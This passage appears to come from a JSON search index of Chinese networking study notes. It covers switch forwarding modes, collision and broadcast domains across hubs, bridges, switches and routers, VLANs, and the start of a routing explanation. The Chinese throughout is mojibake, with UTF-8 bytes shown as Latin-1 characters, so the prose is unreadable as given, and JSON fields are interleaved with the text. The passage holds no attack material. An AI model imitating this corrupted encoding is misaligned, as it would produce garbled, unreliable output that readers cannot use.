åœ°å€ï¼Œåˆ™äº¤æ¢æœºæŠŠè¯¥å¸§æ³›æ´ªï¼ˆfloodï¼‰è‡³é™¤äº†è¿›å…¥ç«¯å£ä»¥å¤–çš„æ‰€æœ‰ç«¯å£ã€‚ï¼ˆå¦‚æœåœ¨è¡¨é¡¹ä¸­åˆ™å¯ä»¥ç›´æ¥æ­£å¸¸é€šä¿¡ï¼‰ ç›®æ ‡è®¾å¤‡ï¼ˆPC 3ï¼‰è¿”å›ç›®çš„åœ°å€ä¸º PC 1 çš„å•æ’­å¸§ã€‚ äº¤æ¢æœºåœ°å€è¡¨ä¸­è¾“å…¥ PC 3 çš„æº MAC åœ°å€ä»¥åŠè¿›å…¥çš„ç«¯å£å·ã€‚ äº¤æ¢æœºç°åœ¨å¯ä»¥åœ¨æº PC 1 å’Œç›®æ ‡è®¾å¤‡ PC 3 ä¹‹é—´ä¼ é€å¸§è€Œæ— éœ€æ³›æ´ªã€‚  äº¤æ¢æœºçš„è½¬å‘æ–¹å¼ #  å­˜å‚¨è½¬å‘äº¤æ¢ Store-and-Forward #  è¿è¡Œåœ¨å­˜å‚¨è½¬å‘æ¨¡å¼ä¸‹çš„äº¤æ¢æœºåœ¨å‘é€ä¿¡æ¯å‰è¦æŠŠæ•´å¸§æ•°æ®è¯»å…¥å†…å­˜å¹¶æ£€æŸ¥å…¶æ­£ç¡®æ€§ã€‚\nå°½ç®¡é‡‡ç”¨è¿™ç§æ–¹å¼æ¯”é‡‡ç”¨ç›´é€šæ–¹å¼æ›´èŠ±æ—¶é—´ï¼Œä½†é‡‡ç”¨è¿™ç§æ–¹å¼å¯ä»¥å­˜å‚¨è½¬å‘æ•°æ®ï¼Œä»è€Œä¿è¯å…¶å‡†ç¡®æ€§ã€‚ç”±äºè¿è¡Œåœ¨å­˜å‚¨è½¬å‘æ¨¡å¼ä¸‹çš„äº¤æ¢æœºä¸ä¼ æ’­é”™è¯¯æ•°æ®ï¼Œå› è€Œæ›´é€‚åˆå¤§å‹å±€åŸŸç½‘ã€‚\nå­˜å‚¨è½¬å‘æ¨¡å¼æœ‰ä¸¤å¤§ä¸»è¦ç‰¹å¾åŒºåˆ«äºç›´é€šè½¬å‘æ¨¡å¼ï¼š\n å·®é”™æ§åˆ¶ï¼šåœ¨è¿›å…¥ç«¯å£æ¥æ”¶å®Œæ•´ä¸€å¸§ä¹‹åï¼Œäº¤æ¢æœºå°†æ•°æ®æŠ¥æœ€åä¸€ä¸ªå­—æ®µçš„å¸§æ ¡éªŒåºåˆ—ï¼ˆframe check sequence, FCSï¼‰ä¸è‡ªå·±çš„ FCS è¿›è¡Œæ¯”è¾ƒã€‚FCS æ ¡éªŒè¿‡ç¨‹ç”¨ä»¥å¸®åŠ©ç¡®ä¿å¸§æ²¡æœ‰ç‰©ç†åŠæ•°æ®é“¾è·¯é”™è¯¯ï¼Œå¦‚æœè¯¥å¸§æ ¡éªŒæ­£ç¡®ï¼Œåˆ™è½¬å‘ã€‚å¦åˆ™ä¸¢å¼ƒã€‚ è‡ªåŠ¨ç¼“å­˜ï¼šå­˜å‚¨è½¬å‘äº¤æ¢æœºé€šè¿‡è¿›å…¥ç«¯å£ç¼“å­˜ï¼Œæ”¯æŒä¸åŒé€Ÿç‡ä»¥å¤ªç½‘çš„æ··åˆè¿æ¥ã€‚ä¾‹å¦‚ï¼Œæ¥æ”¶åˆ°ä¸€ä¸ªä»¥ 1Gb/s é€Ÿç‡å‘å‡ºçš„å¸§ï¼Œè½¬å‘è‡³ç™¾å…†ä»¥å¤ªç½‘ç«¯å£ï¼Œå°±éœ€è¦ä½¿ç”¨å­˜å‚¨è½¬å‘æ–¹å¼ã€‚å½“è¿›å…¥ä¸è¾“å‡ºç«¯å£é€Ÿç‡ä¸åŒ¹é…æ—¶ï¼Œäº¤æ¢æœºå°†æ•´å¸§å†…å®¹æ”¾å…¥ç¼“å­˜ä¸­ï¼Œè®¡ç®— FCS æ ¡éªŒï¼Œè½¬å‘è‡³è¾“å‡ºç¼“å­˜ä¹‹åå°†å¸§å‘å‡ºã€‚  Cisco çš„ä¸»è¦äº¤æ¢æ–¹å¼æ˜¯å­˜å‚¨è½¬å‘äº¤æ¢ã€‚\nç›´é€šäº¤æ¢ Cut-Through #  é‡‡ç”¨ç›´é€šæ¨¡å¼çš„äº¤æ¢æœºä¼šåœ¨æ¥æ”¶å®Œæ•´ä¸ªæ•°æ®åŒ…ä¹‹å‰å°±è¯»å–å¸§å¤´ï¼Œå¹¶å†³å®šæŠŠæ•°æ®å‘å¾€å“ªä¸ªç«¯å£ã€‚ç›´é€šäº¤æ¢çš„ä¸€ä¸ªä¼˜åŠ¿æ˜¯æ¯”å­˜å‚¨è½¬å‘æŠ€æœ¯æ›´ä¸ºå¿«é€Ÿï¼Œä¸ç”¨ç¼“å­˜æ•°æ®ä¹Ÿä¸ç”¨æ£€æŸ¥æ•°æ®çš„å®Œæ•´æ€§ã€‚\nè¿™ç§äº¤æ¢æ–¹å¼æœ‰ä¸¤å¤§ç‰¹ç‚¹ï¼š\n  å¿«é€Ÿå¸§è½¬å‘ï¼šä¸€æ—¦äº¤æ¢æœºåœ¨ MAC åœ°å€è¡¨ä¸­æŸ¥æ‰¾åˆ°ç›®çš„ MAC åœ°å€ï¼Œå°±ç«‹åˆ»åšå‡ºè½¬å‘å†³å®šã€‚è€Œæ— éœ€ç­‰å¾…å¸§çš„å‰©ä½™éƒ¨åˆ†è¿›å…¥ç«¯å£å†åšå‡ºè½¬å‘å†³å®šã€‚\n  æ— æ•ˆå¸§å¤„ç†ï¼šå¯¹äºå¤§å¤šæ•°æ— æ•ˆå¸§ï¼Œç›´é€šæ–¹å¼äº¤æ¢æœºå¹¶ä¸å°†å…¶ä¸¢å¼ƒã€‚\né”™è¯¯å¸§è¢«è½¬å‘è‡³å…¶ä»–ç½‘æ®µã€‚å¦‚æœç½‘ç»œä¸­å‡ºç°é«˜å·®é”™ç‡ï¼ˆæ— æ•ˆå¸§ï¼‰ï¼Œç›´é€šäº¤æ¢å¯èƒ½ä¼šå¯¹å¸¦å®½é€ æˆä¸åˆ©å½±å“ï¼ŒæŸåä»¥åŠæ— æ•ˆå¸§ä¼šé€ æˆå¸¦å®½æ‹¥å¡ã€‚åœ¨æ‹¥å¡æƒ…å†µä¸‹ï¼Œè¿™ç§äº¤æ¢æœºå¿…é¡»åƒå­˜å‚¨è½¬å‘äº¤æ¢æœºé‚£æ ·ç¼“å­˜ã€‚\n  æ— ç¢ç‰‡è½¬å‘ Fragment-Free #  æ— ç¢ç‰‡è½¬å‘æ˜¯ç›´é€šæ–¹å¼çš„ä¸€ç§æ”¹è¿›æ¨¡å¼ã€‚äº¤æ¢æœºè½¬å‘ä¹‹å‰æ£€æŸ¥å¸§æ˜¯å¦å¤§äº 64 å­—èŠ‚ï¼ˆå°äºåˆ™ä¸¢å¼ƒï¼‰ï¼Œä»¥ä¿è¯æ²¡æœ‰ç¢ç‰‡å¸§ã€‚æ— ç¢ç‰‡æ–¹å¼æ¯”ç›´é€šæ–¹å¼æ‹¥æœ‰æ›´å¥½çš„å·®é”™æ£€æµ‹ï¼Œè€Œå®é™…ä¸Šæ²¡æœ‰å¢åŠ å»¶æ—¶ã€‚\nå®ƒæ¯”è¾ƒé€‚åˆäºé«˜æ€§èƒ½è®¡ç®—åº”ç”¨ï¼Œå³è¿›ç¨‹åˆ°è¿›ç¨‹å»¶æ—¶å°äº 10ms çš„åº”ç”¨åœºæ™¯ã€‚\nå†²çªåŸŸå¹¿æ’­åŸŸ #   å­¦ä¹ åœ°å€ï¼š\n https://www.cnblogs.com/bakari/archive/2012/09/08/2677086.html   æ¦‚å¿µç†è§£ #  å†²çªåŸŸ #  è¿æ¥åœ¨åŒä¸€å¯¼çº¿ä¸Šçš„æ‰€æœ‰å·¥ä½œç«™çš„é›†åˆï¼Œæˆ–è€…è¯´æ˜¯åŒä¸€ç‰©ç†ç½‘æ®µä¸Šæ‰€æœ‰èŠ‚ç‚¹çš„é›†åˆæˆ–ä»¥å¤ªç½‘ä¸Šç«äº‰åŒä¸€å¸¦å®½çš„èŠ‚ç‚¹é›†åˆã€‚è¿™ä¸ªåŸŸä»£è¡¨äº†å†²çªåœ¨å…¶ä¸­å‘ç”Ÿå¹¶ä¼ æ’­çš„åŒºåŸŸï¼Œè¿™ä¸ªåŒºåŸŸå¯ä»¥è¢«è®¤ä¸ºæ˜¯å…±äº«æ®µã€‚åœ¨ OSI æ¨¡å‹ä¸­ï¼Œå†²çªåŸŸè¢«çœ‹ä½œæ˜¯ç¬¬ä¸€å±‚çš„æ¦‚å¿µï¼Œè¿æ¥åŒä¸€å†²çªåŸŸçš„è®¾å¤‡æœ‰ Hubï¼ŒReperter æˆ–è€…å…¶ä»–è¿›è¡Œç®€å•å¤åˆ¶ä¿¡å·çš„è®¾å¤‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨ Hub æˆ–è€… Repeater è¿æ¥çš„æ‰€æœ‰èŠ‚ç‚¹å¯ä»¥è¢«è®¤ä¸ºæ˜¯åœ¨åŒä¸€ä¸ªå†²çªåŸŸå†…ï¼Œå®ƒä¸ä¼šåˆ’åˆ†å†²çªåŸŸã€‚\nå¹¿æ’­åŸŸ #  æ¥æ”¶åŒæ ·å¹¿æ’­æ¶ˆæ¯çš„èŠ‚ç‚¹çš„é›†åˆã€‚å¦‚ï¼šåœ¨è¯¥é›†åˆä¸­çš„ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹ä¼ è¾“ä¸€ä¸ªå¹¿æ’­å¸§ï¼Œåˆ™æ‰€æœ‰å…¶ä»–èƒ½æ”¶åˆ°è¿™ä¸ªå¸§çš„èŠ‚ç‚¹éƒ½è¢«è®¤ä¸ºæ˜¯è¯¥å¹¿æ’­å¸§çš„ä¸€éƒ¨åˆ†ã€‚ç”±äºè®¸å¤šè®¾å¤‡éƒ½ææ˜“äº§ç”Ÿå¹¿æ’­ï¼Œæ‰€ä»¥å¦‚æœä¸ç»´æŠ¤ï¼Œå°±ä¼šæ¶ˆè€—å¤§é‡çš„å¸¦å®½ï¼Œé™ä½ç½‘ç»œçš„æ•ˆç‡ã€‚ç”±äºå¹¿æ’­åŸŸè¢«è®¤ä¸ºæ˜¯ OSI ä¸­çš„ç¬¬äºŒå±‚æ¦‚å¿µï¼Œæ‰€ä»¥åƒ Hubï¼Œäº¤æ¢æœºç­‰ç¬¬ä¸€ï¼Œç¬¬äºŒå±‚è®¾å¤‡è¿æ¥çš„èŠ‚ç‚¹è¢«è®¤ä¸ºéƒ½æ˜¯åœ¨åŒä¸€ä¸ªå¹¿æ’­åŸŸã€‚è€Œè·¯ç”±å™¨ï¼Œç¬¬ä¸‰å±‚äº¤æ¢æœºåˆ™å¯ä»¥åˆ’åˆ†å¹¿æ’­åŸŸï¼Œå³å¯ä»¥è¿æ¥ä¸åŒçš„å¹¿æ’­åŸŸã€‚\nåœ¨ä¸åŒç½‘ç»œäº’è”è®¾å¤‡ä¸Šçš„ç‰¹ç‚¹ #  ä¼ ç»Ÿä»¥å¤ªç½‘æ“ä½œ #  ä¸»æœº A åªæ˜¯æƒ³è¦å‘é€ä¸€ä¸ªå•æ’­æ•°æ®åŒ…ç»™ä¸»æœº Bã€‚ä½†ç”±äºä¼ ç»Ÿå…±äº«å¼ä»¥å¤ªç½‘çš„å¹¿æ’­æ€§è´¨ï¼Œæ¥å…¥åˆ°æ€»çº¿ä¸Šçš„æ‰€æœ‰ä¸»æœºéƒ½å°†æ”¶åˆ°æ­¤å•æ’­æ•°æ®åŒ…ã€‚åŒæ—¶ï¼Œæ­¤æ—¶å¦‚æœä»»ä½•ç¬¬äºŒæ–¹ï¼ŒåŒ…æ‹¬ä¸»æœº B ä¹Ÿè¦å‘é€æ•°æ®åˆ°æ€»çº¿ä¸Šéƒ½å°†å†²çªï¼Œå¯¼è‡´åŒæ–¹æ•°æ®å‘é€å¤±è´¥ã€‚æˆ‘ä»¬ç§°è¿æ¥åœ¨æ€»çº¿ä¸Šçš„æ‰€æœ‰ä¸»æœºå…±åŒæ„æˆäº†ä¸€ä¸ªå†²çªåŸŸã€‚\nå½“ä¸»æœº A å‘é€ä¸€ä¸ªç›®æ ‡æ˜¯æ‰€æœ‰ä¸»æœºçš„å¹¿æ’­ç±»å‹æ•°æ®åŒ…æ—¶ï¼Œæ€»çº¿ä¸Šçš„æ‰€æœ‰ä¸»æœºéƒ½è¦æ¥æ”¶è¯¥å¹¿æ’­æ•°æ®åŒ…ï¼Œå¹¶æ£€æŸ¥å¹¿æ’­æ•°æ®åŒ…çš„å†…å®¹ï¼Œå¦‚æœéœ€è¦çš„è¯åŠ ä»¥è¿›ä¸€æ­¥çš„å¤„ç†ã€‚æˆ‘ä»¬ç§°è¿æ¥åœ¨æ€»çº¿ä¸Šçš„æ‰€æœ‰ä¸»æœºå…±åŒæ„æˆäº†ä¸€ä¸ªå¹¿æ’­åŸŸã€‚\nå¦‚ä¸‹å›¾ï¼š\nä¸­ç»§å™¨ Repeater #  ä¸­ç»§å™¨å‡ºç°çš„ä¸¤ä¸ªåŠŸèƒ½ä¸ºï¼š\n æ‰©å±•ç½‘ç»œè·ç¦»ï¼Œå°†è¡°å‡ä¿¡å·ç»è¿‡å†ç”Ÿã€‚ å®ç°ç²—åŒè½´ç”µç¼†ä»¥å¤ªç½‘å’Œç»†åŒè½´ç”µç¼†ä»¥å¤ªç½‘çš„äº’è¿ã€‚  é€šè¿‡ä¸­ç»§å™¨è™½ç„¶å¯ä»¥å»¶é•¿ä¿¡å·ä¼ è¾“çš„è·ç¦»ã€å®ç°ä¸¤ä¸ªç½‘æ®µçš„äº’è¿ã€‚ä½†å¹¶æ²¡æœ‰å¢åŠ ç½‘ç»œçš„å¯ç”¨å¸¦å®½ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç½‘æ®µ 1 å’Œç½‘æ®µ 2 ç»è¿‡ä¸­ç»§å™¨è¿æ¥åæ„æˆäº†ä¸€ä¸ªå•ä¸ªçš„å†²çªåŸŸå’Œå¹¿æ’­åŸŸï¼š\né›†çº¿å™¨ HUB #  é›†çº¿å™¨å®é™…ä¸Šç›¸å½“äºå¤šç«¯å£çš„ä¸­ç»§å™¨ã€‚é›†çº¿å™¨é€šå¸¸æœ‰8ä¸ªã€16ä¸ªæˆ–24ä¸ªç­‰æ•°é‡ä¸ç­‰çš„æ¥å£ã€‚\né›†çº¿å™¨åŒæ ·å¯ä»¥å»¶é•¿ç½‘ç»œçš„é€šä¿¡è·ç¦»ï¼Œæˆ–è¿æ¥ç‰©ç†ç»“æ„ä¸åŒçš„ç½‘ç»œï¼Œä½†ä¸»è¦è¿˜æ˜¯ä½œä¸ºä¸€ä¸ªä¸»æœºç«™ç‚¹çš„æ±‡èšç‚¹ï¼Œå°†è¿æ¥åœ¨é›†çº¿å™¨ä¸Šå„ä¸ªæ¥å£ä¸Šçš„ä¸»æœºè”ç³»èµ·æ¥ä½¿ä¹‹å¯ä»¥äº’ç›¸é€šä¿¡ã€‚\nå®é™…ä¸Šï¼Œåœ¨é›†çº¿å™¨å†…éƒ¨ï¼Œå„æ¥å£éƒ½æ˜¯é€šè¿‡èƒŒæ¿æ€»çº¿è¿æ¥åœ¨ä¸€èµ·çš„ï¼Œåœ¨é€»è¾‘ä¸Šä»æ„æˆä¸€ä¸ªå…±äº«çš„æ€»çº¿ã€‚å› æ­¤ï¼Œé›†çº¿å™¨å’Œå…¶æ‰€æœ‰æ¥å£æ‰€æ¥çš„ä¸»æœºå…±åŒæ„æˆäº†ä¸€ä¸ªå†²çªåŸŸå’Œä¸€ä¸ªå¹¿æ’­åŸŸã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nç½‘æ¡¥ Bridge #  ç½‘æ¡¥ï¼ˆBridgeï¼‰åˆç§°ä¸ºæ¡¥æ¥å™¨ã€‚å’Œä¸­ç»§å™¨ç±»ä¼¼ï¼Œä¼ ç»Ÿçš„ç½‘æ¡¥åªæœ‰ä¸¤ä¸ªç«¯å£ï¼Œç”¨äºè¿æ¥ä¸åŒçš„ç½‘æ®µã€‚å’Œä¸­ç»§å™¨ä¸åŒçš„æ˜¯ï¼Œç½‘æ¡¥å…·æœ‰ä¸€å®šçš„\u0026quot;æ™ºèƒ½\u0026quot;æ€§ï¼Œå¯ä»¥\u0026quot;å­¦ä¹ \u0026quot;ç½‘ç»œä¸Šä¸»æœºçš„åœ°å€ï¼ŒåŒæ—¶å…·æœ‰ä¿¡å·è¿‡æ»¤çš„åŠŸèƒ½ã€‚\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n  ç½‘æ®µ 1 çš„ä¸»æœº A å‘ç»™ä¸»æœº B çš„æ•°æ®åŒ…ä¸ä¼šè¢«ç½‘æ¡¥è½¬å‘åˆ°ç½‘æ®µ 2ã€‚å› ä¸ºï¼Œç½‘æ¡¥å¯ä»¥è¯†åˆ«è¿™æ˜¯ç½‘æ®µ 1 å†…éƒ¨çš„é€šä¿¡æ•°æ®æµã€‚\n  åŒæ ·ï¼Œç½‘æ®µ 2 çš„ä¸»æœº X å‘ç»™ä¸»æœº Y çš„æ•°æ®åŒ…ä¹Ÿä¸ä¼šè¢«ç½‘æ¡¥è½¬å‘åˆ°ç½‘æ®µ 1ã€‚å¯è§ï¼Œç½‘æ¡¥å¯ä»¥å°†ä¸€ä¸ªå†²çªåŸŸåˆ†å‰²ä¸ºä¸¤ä¸ªã€‚å…¶ä¸­ï¼Œæ¯ä¸ªå†²çªåŸŸå…±äº«è‡ªå·±çš„æ€»çº¿ä¿¡é“å¸¦å®½ã€‚\n  ä½†æ˜¯ï¼Œå¦‚æœä¸»æœº C å‘é€äº†ä¸€ä¸ªç›®æ ‡æ˜¯æ‰€æœ‰ä¸»æœºçš„å¹¿æ’­ç±»å‹æ•°æ®åŒ…æ—¶ï¼Œç½‘æ¡¥è¦è½¬å‘è¿™æ ·çš„æ•°æ®åŒ…ã€‚ç½‘æ¡¥ä¸¤ä¾§çš„ä¸¤ä¸ªç½‘æ®µæ€»çº¿ä¸Šçš„æ‰€æœ‰ä¸»æœºéƒ½è¦æ¥æ”¶è¯¥å¹¿æ’­æ•°æ®åŒ…ã€‚å› æ­¤ï¼Œç½‘æ®µ 1 å’Œç½‘æ®µ 2 ä»å±äºåŒä¸€ä¸ªå¹¿æ’­åŸŸã€‚\n  äº¤æ¢æœº Switch #  äº¤æ¢æœºï¼ˆSwitchï¼‰ä¹Ÿè¢«ç§°ä¸ºäº¤æ¢å¼é›†çº¿å™¨ã€‚å®ƒçš„å‡ºç°æ˜¯ä¸ºäº†è§£å†³è¿æ¥åœ¨é›†çº¿å™¨ä¸Šçš„æ‰€æœ‰ä¸»æœºå…±äº«å¯ç”¨å¸¦å®½çš„ç¼ºé™·ã€‚\näº¤æ¢æœºæ˜¯é€šè¿‡ä¸ºéœ€è¦é€šä¿¡çš„ä¸¤å°ä¸»æœºç›´æ¥å»ºç«‹ä¸“ç”¨çš„é€šä¿¡ä¿¡é“æ¥å¢åŠ å¯ç”¨å¸¦å®½çš„ã€‚ä»è¿™ä¸ªè§’åº¦ä¸Šæ¥è®²ï¼Œäº¤æ¢æœºç›¸å½“äºå¤šç«¯å£ç½‘æ¡¥ã€‚\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šäº¤æ¢æœºä¸Šçš„æ¯ä¸ªæ¥å£éƒ½æ˜¯è‡ªå·±çš„ä¸€ä¸ªå†²çªåŸŸã€‚\näº¤æ¢æœºåŒæ ·æ²¡æœ‰è¿‡æ»¤å¹¿æ’­é€šä¿¡çš„åŠŸèƒ½ã€‚å¦‚æœäº¤æ¢æœºæ”¶åˆ°ä¸€ä¸ªå¹¿æ’­æ•°æ®åŒ…åï¼Œå®ƒä¼šå‘å…¶æ‰€æœ‰çš„ç«¯å£è½¬å‘æ­¤å¹¿æ’­æ•°æ®åŒ…ã€‚å› æ­¤ï¼Œäº¤æ¢æœºå’Œå…¶æ‰€æœ‰æ¥å£æ‰€è¿æ¥çš„ä¸»æœºå…±åŒæ„æˆäº†ä¸€ä¸ªå¹¿æ’­åŸŸã€‚\næˆ‘ä»¬å°†ä½¿ç”¨äº¤æ¢æœºä½œä¸ºäº’è¿è®¾å¤‡çš„å±€åŸŸç½‘ç§°ä¸ºäº¤æ¢å¼å±€åŸŸç½‘ã€‚\nè·¯ç”±å™¨ Router #  è·¯ç”±å™¨å·¥ä½œåœ¨ç½‘ç»œå±‚ï¼Œå¯ä»¥è¯†åˆ«ç½‘ç»œå±‚çš„åœ°å€ IP åœ°å€ï¼Œæœ‰èƒ½åŠ›è¿‡æ»¤ç¬¬ 3 å±‚çš„å¹¿æ’­æ¶ˆæ¯ã€‚å®é™…ä¸Šï¼Œé™¤éåšç‰¹æ®Šé…ç½®ï¼Œå¦åˆ™è·¯ç”±å™¨ä»ä¸è½¬å‘å¹¿æ’­ç±»å‹çš„æ•°æ®åŒ…ã€‚å› æ­¤ï¼Œè·¯ç”±å™¨çš„æ¯ä¸ªç«¯å£æ‰€è¿æ¥çš„ç½‘ç»œéƒ½ç‹¬è‡ªæ„æˆä¸€ä¸ªå¹¿æ’­åŸŸå’Œå†²çªåŸŸã€‚\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n"},{"id":398,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/3.vlan%E4%B8%8Etrunk/","title":"3. Vlanä¸ Trunk","section":"ç½‘ç»œåŸºæœ¬åŠŸ","content":" å­¦ä¹ åœ°å€ï¼š\n https://community.emc.com/message/834012#834012   VLAN #  æ¦‚å¿µ #  è™šæ‹Ÿå±€åŸŸç½‘ï¼ˆVLANï¼‰æ˜¯ä¸€ç»„é€»è¾‘ä¸Šçš„è®¾å¤‡å’Œç”¨æˆ·ï¼Œè¿™äº›è®¾å¤‡å’Œç”¨æˆ·å¹¶ä¸å—ç‰©ç†ä½ç½®çš„é™åˆ¶ï¼Œå¯ä»¥æ ¹æ®åŠŸèƒ½ã€éƒ¨é—¨åŠåº”ç”¨ç­‰å› ç´ å°†å®ƒä»¬ç»„ç»‡èµ·æ¥ï¼Œç›¸äº’ä¹‹é—´çš„é€šä¿¡å°±å¥½åƒå®ƒä»¬åœ¨åŒä¸€ä¸ªç½‘æ®µä¸­ä¸€æ ·ï¼Œç”±æ­¤å¾—åè™šæ‹Ÿå±€åŸŸç½‘ã€‚\nVLAN æ˜¯ä¸€ç§æ¯”è¾ƒæ–°çš„æŠ€æœ¯ï¼Œå·¥ä½œåœ¨ OSI å‚è€ƒæ¨¡å‹çš„ç¬¬ 2 å±‚å’Œç¬¬ 3 å±‚ï¼Œä¸€ä¸ª VLAN å°±æ˜¯ä¸€ä¸ªå¹¿æ’­åŸŸï¼ŒVLAN ä¹‹é—´çš„é€šä¿¡æ˜¯é€šè¿‡ç¬¬3å±‚çš„è·¯ç”±å™¨æ¥å®Œæˆçš„ã€‚\néƒ¨ç½²ç»“æ„ #  ä¸‹å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªå¸¸è§„çš„éƒ¨ç½²ï¼Œå·¦è¾¹è¿™å¼ å›¾èŠ‚ç‚¹è¿æ¥åˆ°äº¤æ¢æœºï¼Œäº¤æ¢æœºè¿æ¥åˆ°è·¯ç”±å™¨ã€‚æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½ä½äºåŒä¸€ IP ç½‘ç»œï¼Œå› ä¸ºä»–ä»¬éƒ½è¿æ¥åˆ°è·¯ç”±å™¨åŒä¸€æ¥å£ã€‚\nå¦ä¸€ç§å¸¸ç”¨çš„æ‹“æ‰‘ç»“æ„æ˜¯ä¸¤ä¸ªäº¤æ¢æœºè¢«ä¸€ä¸ªè·¯ç”±å™¨åˆ†ç¦»å¼€æ¥ï¼š\n"},{"id":399,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/4.%E8%B7%AF%E7%94%B1/","title":"4.è·¯ç”±","section":"ç½‘ç»œåŸºæœ¬åŠŸ","content":" å­¦ä¹ åœ°å€ï¼š\n https://community.emc.com/message/835157#835157   è·¯ç”±å™¨ #  ä»¥å¤ªç½‘äº¤æ¢æœºå·¥ä½œåœ¨ç¬¬äºŒå±‚å³æ•°æ®é“¾è·¯å±‚ï¼Œç”¨äºåœ¨åŒä¸€ç½‘ç»œå†…éƒ¨è½¬å‘ä»¥å¤ªç½‘å¸§ã€‚\nä½†æ˜¯ï¼Œå½“æºå’Œç›®çš„IPåœ°å€ä½äºä¸åŒç½‘ç»œæ—¶ï¼Œä»¥å¤ªç½‘å¸§å¿…é¡»å‘é€ç»™è·¯ç”±å™¨ã€‚è·¯ç”±å™¨è´Ÿè´£åœ¨ä¸åŒç½‘ç»œé—´ä¼ è¾“æŠ¥æ–‡ï¼Œé€šè¿‡è·¯ç”±è¡¨æ¥å†³å®šæœ€ä½³è½¬å‘è·¯å¾„ã€‚å½“ä¸»æœºå°†æŠ¥æ–‡å‘é€è‡³ä¸åŒIPåœ°å€æ—¶ï¼Œç”±äºä¸»æœºæ— æ³•ç›´æ¥ä¸æœ¬åœ°ç½‘ç»œä»¥å¤–çš„è®¾å¤‡é€šä¿¡ï¼ŒæŠ¥æ–‡è¢«è½¬å‘è‡³é»˜è®¤ç½‘å…³ã€‚é»˜è®¤ç½‘å…³å°±æ˜¯æ•°æ®æµä»æœ¬åœ°ç½‘ç»œè·¯ç”±è‡³è¿œç«¯è®¾å¤‡çš„ç›®çš„åœ°ã€‚å®ƒé€šå¸¸ç”¨æ¥è¿æ¥æœ¬åœ°ç½‘ä¸å…¬å…±ç½‘ã€‚\næŠ¥æ–‡çš„è½¬å‘è¿‡ç¨‹ #  è·¯ç”±å™¨åœ¨ä¸€ä¸ªæ¥å£æ¥æ”¶æŠ¥æ–‡å¹¶å°†å®ƒä»å¦ä¸€ä¸ªæ¥å£è½¬å‘å‡ºå»ã€‚è·¯ç”±å™¨ä¸»è¦æ‰§è¡Œä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š\n å°†ç¬¬äºŒå±‚çš„å¸§å¤´å’Œå¸§å°¾ç§»é™¤ï¼Œè§£æå‡ºç¬¬ä¸‰å±‚æŠ¥æ–‡ã€‚ æ£€æŸ¥ IP æŠ¥æ–‡çš„ç›®çš„ IP åœ°å€ï¼Œåœ¨è·¯ç”±è¡¨ä¸­æŸ¥æ‰¾æœ€ä½³è·¯ç”±ã€‚ å¦‚æœè·¯ç”±å™¨æ‰¾åˆ°ä¸€æ¡æœ€ä½³è·¯å¾„ï¼Œåˆ™å°†ä¸‰å±‚æŠ¥æ–‡å°è£…åˆ°æ–°çš„äºŒå±‚å¸§ä¸­ï¼Œå¹¶å°†å¸§è½¬å‘åˆ°è¾“å‡ºç«¯å£ã€‚  å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nè¿‡ç¨‹è¯¦è§£ #  å‘é€æŠ¥æ–‡ #  PC 1 å‘é€æŠ¥æ–‡ç»™PC 2 æ—¶ï¼š\n é¦–å…ˆå¿…é¡»ç¡®å®šç›®çš„ IPv4 åœ°å€æ˜¯å¦ä½äºåŒä¸€ç½‘ç»œã€‚  PC 1 é€šè¿‡å°†è‡ªå·±çš„ IPv4 åœ°å€ä¸å­ç½‘æ©ç åšä¸æ“ä½œï¼Œæ¥åˆ¤æ–­ PC 1 æ‰€å±çš„ç½‘æ®µã€‚ æ¥ä¸‹æ¥ï¼ŒPC 1 å¯¹ç›®çš„ IPv4 åœ°å€ä¸ PC 1 çš„å­ç½‘æ©ç åšåŒæ ·çš„ä¸æ“ä½œã€‚   å¦‚æœç›®çš„ç½‘ç»œåœ°å€ä¸PC 1ç½‘æ®µç›¸åŒï¼Œåˆ™PC 1ä¸ä½¿ç”¨é»˜è®¤ç½‘å…³ï¼Œè€Œæ˜¯åœ¨ ARP ç¼“å­˜ä¸­æŸ¥æ‰¾ç›®çš„ IPv4 åœ°å€çš„è®¾å¤‡MACåœ°å€ã€‚å¦‚æœMACåœ°å€ä¸åœ¨ç¼“å­˜ä¸­ï¼Œåˆ™ PC 1 äº§ç”Ÿä¸€ä¸ª ARP è¯·æ±‚æ¥è·å–åœ°å€å¹¶å°†æŠ¥æ–‡å‘ç»™ç›®çš„åœ°å€ã€‚ å¦‚æœç›®çš„ç½‘ç»œåœ°å€ä½äºå¦ä¸€ç½‘ç»œï¼Œåˆ™PC 1å°†æŠ¥æ–‡è½¬å‘è‡³é»˜è®¤ç½‘å…³ã€‚  è¦ç¡®å®šé»˜è®¤ç½‘å…³çš„ MAC åœ°å€ï¼ŒPC 1 åœ¨å®ƒçš„ ARP è¡¨ä¸­æŸ¥æ‰¾é»˜è®¤ç½‘å…³çš„ IPv4 åœ°å€ä»¥åŠç›¸åº”çš„ MAC åœ°å€ã€‚ å¦‚æœ ARP è¡¨ä¸­æ²¡æœ‰é»˜è®¤ç½‘å…³çš„å¯¹åº”è¡¨é¡¹ï¼Œåˆ™ PC 1 å‘é€ ARP è¯·æ±‚ã€‚è·¯ç”±å™¨ R1 å›å¤ ARP å“åº”ã€‚ä¹‹å PC 1 å°†æŠ¥æ–‡è½¬å‘è‡³é»˜è®¤ç½‘å…³çš„ MAC 